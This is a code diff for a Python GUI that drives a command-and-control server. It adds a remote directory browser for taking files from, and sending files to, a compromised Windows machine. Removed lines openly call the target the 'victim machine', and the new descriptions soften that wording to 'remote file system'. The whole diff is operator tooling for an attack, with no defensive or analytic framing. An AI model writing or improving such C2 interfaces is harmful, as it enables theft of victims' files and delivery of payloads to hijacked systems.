@@ -6,6 +6,8 @@ import csv
 from pathlib import Path
 from PIL import Image, ImageTk
 import sv_ttk
+from pathlib import PureWindowsPath
+
 
 # Import the wrapper module
 try:
@@ -16,6 +18,302 @@ except ImportError as e:
     WRAPPER_LOADED = False
 
 C2_PORT = 3000  # Default port
+
+
+class DirectoryBrowser:
+    """Directory browser window for navigating remote file system"""
+    
+    def __init__(self, parent, c2_wrapper, initial_path="C:\\", mode="download"):
+        """
+        Args:
+            parent: Parent window
+            c2_wrapper: C2Wrapper instance
+            initial_path: Starting directory path
+            mode: 'download' or 'upload'
+        """
+        self.parent = parent
+        self.c2 = c2_wrapper
+        self.current_path = initial_path
+        self.mode = mode
+        self.selected_file = None
+        
+        # Create browser window
+        self.window = tk.Toplevel(parent)
+        self.window.title(f"Remote Directory Browser - {mode.capitalize()}")
+        self.window.geometry("800x600")
+        self.window.transient(parent)
+        self.window.grab_set()
+        
+        self._setup_ui()
+        self._load_directory(initial_path)
+        
+    def _setup_ui(self):
+        main_frame = ttk.Frame(self.window, padding=10)
+        main_frame.pack(fill=tk.BOTH, expand=True)
+        
+        # Path navigation bar
+        nav_frame = ttk.Frame(main_frame)
+        nav_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        ttk.Label(nav_frame, text="Path:", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=(0, 5))
+        
+        self.path_entry = ttk.Entry(nav_frame, font=("Consolas", 10))
+        self.path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
+        self.path_entry.bind('<Return>', lambda e: self._load_directory(self.path_entry.get()))
+        
+        ttk.Button(
+            nav_frame,
+            text="Go",
+            command=lambda: self._load_directory(self.path_entry.get()),
+            width=8
+        ).pack(side=tk.LEFT)
+        
+        # Directory content table
+        table_frame = ttk.Frame(main_frame)
+        table_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
+        
+        # Create treeview
+        self.tree = ttk.Treeview(table_frame, columns=("Type", "Name", "Modified"), show="headings")
+        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        
+        # Configure columns
+        self.tree.heading("Type", text="Type")
+        self.tree.heading("Name", text="Name")
+        self.tree.heading("Modified", text="Modified")
+        
+        self.tree.column("Type", width=80, anchor="center")
+        self.tree.column("Name", width=400, anchor="w")
+        self.tree.column("Modified", width=180, anchor="center")
+        
+        # Scrollbars
+        scrollbar_y = ttk.Scrollbar(table_frame, orient="vertical", command=self.tree.yview)
+        scrollbar_y.pack(side=tk.RIGHT, fill=tk.Y)
+        self.tree.configure(yscrollcommand=scrollbar_y.set)
+        
+        # Bind double-click
+        self.tree.bind("<Double-1>", self._on_double_click)
+        
+        # Alternate row colors
+        self.tree.tag_configure("folder", background="#2a4a6a")
+        self.tree.tag_configure("file", background="#1d1d1d")
+        self.tree.tag_configure("parent", background="#3a3a3a")
+        
+        # Button frame
+        btn_frame = ttk.Frame(main_frame)
+        btn_frame.pack(fill=tk.X)
+        
+        if self.mode == "download":
+            ttk.Button(
+                btn_frame,
+                text="Download",
+                command=self._download_selected,
+                width=25
+            ).pack(side=tk.LEFT, padx=5)
+        else:  # upload mode
+            ttk.Button(
+                btn_frame,
+                text="Upload",
+                command=self._upload_here,
+                width=25
+            ).pack(side=tk.LEFT, padx=5)
+        
+        ttk.Button(
+            btn_frame,
+            text="Refresh",
+            command=lambda: self._load_directory(self.current_path),
+            width=15
+        ).pack(side=tk.LEFT, padx=5)
+        
+        ttk.Button(
+            btn_frame,
+            text="Cancel",
+            command=self.window.destroy,
+            width=15
+        ).pack(side=tk.LEFT, padx=5)
+        
+    def _load_directory(self, path):
+        """Load directory contents from remote machine"""
+        try:
+            self.window.update()
+            
+            # Get directory content
+            csv_data = self.c2.get_content_from_dir(path)
+            
+            # Clear existing items
+            for item in self.tree.get_children():
+                self.tree.delete(item)
+            
+            # Parse CSV
+            reader = csv.DictReader(io.StringIO(csv_data))
+            rows = list(reader)
+            
+            if not rows:
+                self.current_path = path
+                self.path_entry.delete(0, tk.END)
+                self.path_entry.insert(0, path)
+                return
+            
+            # Add parent directory entry (..)
+            parent_path = str(Path(path).parent)
+            if path != parent_path:  # Don't add .. at root
+                self.tree.insert("", 0, values=("folder", "..", ""), tags=("parent",))
+            
+            # Add folders first, then files
+            folders = [row for row in rows if row.get("type", "").lower() == "folder"]
+            files = [row for row in rows if row.get("type", "").lower() == "file"]
+            
+            for folder in folders:
+                name = folder.get("name", "")
+                modified = folder.get("modified", "")
+                self.tree.insert("", tk.END, values=("Folder", name, modified), tags=("folder",))
+            
+            for file in files:
+                name = file.get("name", "")
+                modified = file.get("modified", "")
+                self.tree.insert("", tk.END, values=("File", name, modified), tags=("file",))
+            
+            self.current_path = path
+            self.path_entry.delete(0, tk.END)
+            self.path_entry.insert(0, path)
+            
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to load directory:\n{e}")
+    
+    def _on_double_click(self, event):
+        """Handle double-click on tree item"""
+        selection = self.tree.selection()
+        if not selection:
+            return
+        
+        item = selection[0]
+        values = self.tree.item(item, "values")
+        
+        if not values:
+            return
+        
+        item_type = values[0]
+        item_name = values[1]
+        
+        # Handle parent directory (..)
+        if item_name == "..":
+            p = PureWindowsPath(self.current_path) # Cross platform moment
+            parent_path = str(p.parent)
+            self._load_directory(parent_path)
+            return
+        
+        # Handle folder navigation
+        if "Folder" in item_type or item_type.lower() == "folder":
+            # Construct new path
+            if self.current_path.endswith("\\"):
+                new_path = self.current_path + item_name
+            else:
+                new_path = self.current_path + "\\" + item_name
+            self._load_directory(new_path)
+        
+        # Handle file selection (download mode)
+        elif self.mode == "download" and ("File" in item_type or item_type.lower() == "file"):
+            if self.current_path.endswith("\\"):
+                remote_file = self.current_path + item_name
+            else:
+                remote_file = self.current_path + "\\" + item_name
+            self._download_file(remote_file, item_name)
+    
+    def _download_file(self, remote_path, filename):
+        """Download a specific file"""
+        try:
+            local_path = Path.cwd() / filename
+            
+            # If file exists, add number suffix
+            counter = 1
+            original_name = local_path.stem
+            extension = local_path.suffix
+            while local_path.exists():
+                local_path = Path.cwd() / f"{original_name}_{counter}{extension}"
+                counter += 1
+            
+            self.window.update()
+            
+            self.c2.download_file(remote_path, str(local_path))
+            
+            if local_path.exists():
+                file_size = local_path.stat().st_size
+                messagebox.showinfo(
+                    "Success",
+                    f"File downloaded successfully!\n\n"
+                    f"Saved to: {local_path}\n"
+                    f"Size: {file_size} bytes"
+                )
+            else:
+                raise Exception("Download completed but file not found")
+                
+        except Exception as e:
+            messagebox.showerror("Download Failed", f"Failed to download file:\n{e}")
+    
+    def _download_selected(self):
+        """Download currently selected file"""
+        selection = self.tree.selection()
+        if not selection:
+            messagebox.showwarning("No Selection", "Please select a file to download")
+            return
+        
+        item = selection[0]
+        values = self.tree.item(item, "values")
+        
+        if not values:
+            return
+        
+        item_type = values[0]
+        item_name = values[1]
+        
+        if "Folder" in item_type or item_type.lower() == "folder":
+            messagebox.showwarning("Invalid Selection", "Please select a file, not a folder")
+            return
+        
+        if item_name == "..":
+            messagebox.showwarning("Invalid Selection", "Please select a file")
+            return
+        
+        if self.current_path.endswith("\\"):
+            remote_file = self.current_path + item_name
+        else:
+            remote_file = self.current_path + "\\" + item_name
+        
+        self._download_file(remote_file, item_name)
+    
+    def _upload_here(self):
+        """Upload file to current directory"""
+        local_path = filedialog.askopenfilename(
+            title="Select file to upload",
+            parent=self.window
+        )
+        
+        if not local_path:
+            return
+        
+        filename = Path(local_path).name
+        
+        if self.current_path.endswith("\\"):
+            remote_path = self.current_path + filename
+        else:
+            remote_path = self.current_path + "\\" + filename
+        
+        try:
+            self.window.update()  
+            self.c2.upload_file(local_path, remote_path)
+            file_size = Path(local_path).stat().st_size
+            
+            messagebox.showinfo(
+                "Success",
+                f"File uploaded successfully!\n\n"
+                f"Remote path: {remote_path}\n"
+                f"Size: {file_size} bytes"
+            )
+            
+            # Refresh directory view
+            self._load_directory(self.current_path)
+            
+        except Exception as e:
+            messagebox.showerror("Upload Failed", f"Failed to upload file:\n{e}")
 
 
 class C2ServerGUI:
@@ -135,13 +433,13 @@ class C2ServerGUI:
             },
             {
                 "text": "Download File",
-                "desc": "Retrieve file from victim machine",
+                "desc": "Browse remote file system and download files",
                 "command": self.download_file,
                 "var_name": "download_btn"
             },
             {
                 "text": "Upload File",
-                "desc": "Send file to victim machine",
+                "desc": "Browse remote file system and upload files",
                 "command": self.upload_file,
                 "var_name": "upload_btn"
             }
@@ -560,81 +858,22 @@ class C2ServerGUI:
             self.log(f"Display error: {e}", "error")
             
     def download_file(self):
-        remote_path = simpledialog.askstring(
-            "Download File",
-            "Enter remote file path on victim machine:\n"
-            "(e.g., C:\\Users\\victim\\Desktop\\document.txt)",
-            parent=self.root
-        )
-        
-        if not remote_path:
-            return
-        
-        local_path = filedialog.asksaveasfilename(
-            title="Save downloaded file as",
-            initialfile=Path(remote_path).name,
-            defaultextension=Path(remote_path).suffix
-        )
-        
-        if not local_path:
-            return
-        
+        """Open directory browser for downloading files"""
         try:
-            self.c2.download_file(remote_path, local_path)
-            
-            if Path(local_path).exists():
-                file_size = Path(local_path).stat().st_size
-                self.log(f"Downloaded: {Path(local_path).name} ({file_size} bytes)", "success")
-                messagebox.showinfo(
-                    "Success",
-                    f"File downloaded successfully!\n\n"
-                    f"Saved to: {local_path}\n"
-                    f"Size: {file_size} bytes"
-                )
-                
+            self.log("Opening remote directory browser...", "info")
+            DirectoryBrowser(self.root, self.c2, initial_path="C:\\", mode="download")
         except Exception as e:
-            self.log(f"Download error: {e}", "error")
-            messagebox.showerror(
-                "Download Failed",
-                f"Failed to download file:\n{e}"
-            )
+            self.log(f"Browser error: {e}", "error")
+            messagebox.showerror("Error", f"Failed to open directory browser:\n{e}")
             
     def upload_file(self):
-        local_path = filedialog.askopenfilename(
-            title="Select file to upload"
-        )
-        
-        if not local_path:
-            return
-        
-        default_name = Path(local_path).name
-        remote_path = simpledialog.askstring(
-            "Upload File",
-            f"Enter destination path on victim machine:\n"
-            f"(e.g., C:\\Temp\\{default_name})",
-            initialvalue=f"C:\\Temp\\{default_name}",
-            parent=self.root
-        )
-        
-        if not remote_path:
-            return
-        
+        """Open directory browser for uploading files"""
         try:
-            self.c2.upload_file(local_path, remote_path)
-            file_size = Path(local_path).stat().st_size
-            self.log(f"Uploaded: {Path(local_path).name} ({file_size} bytes)", "success")
-            messagebox.showinfo(
-                "Success",
-                f"File uploaded successfully!\n\n"
-                f"Remote path: {remote_path}"
-            )
-            
+            self.log("Opening remote directory browser...", "info")
+            DirectoryBrowser(self.root, self.c2, initial_path="C:\\", mode="upload")
         except Exception as e:
-            self.log(f"Upload error: {e}", "error")
-            messagebox.showerror(
-                "Upload Failed",
-                f"Failed to upload file:\n{e}"
-            )
+            self.log(f"Browser error: {e}", "error")
+            messagebox.showerror("Error", f"Failed to open directory browser:\n{e}")
 
 
 def main():
